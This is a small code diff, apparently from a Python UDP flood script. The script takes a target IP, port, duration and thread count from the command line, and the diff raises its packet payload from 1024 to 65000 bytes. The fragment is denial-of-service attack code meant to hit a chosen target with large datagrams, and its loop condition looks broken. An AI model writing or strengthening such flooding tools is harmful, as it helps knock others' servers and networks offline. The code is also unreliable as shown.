@@ -9,7 +9,7 @@ thread = int(sys.argv[4])
 def start():
     target_ip = target # Replace with the target IP address
     target_port = port # Replace with the target port
-    bytes = 1024 # Generate random bytes
+    bytes = 65000 # Generate random bytes
     counter = 0
     while counter == tim1*10:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
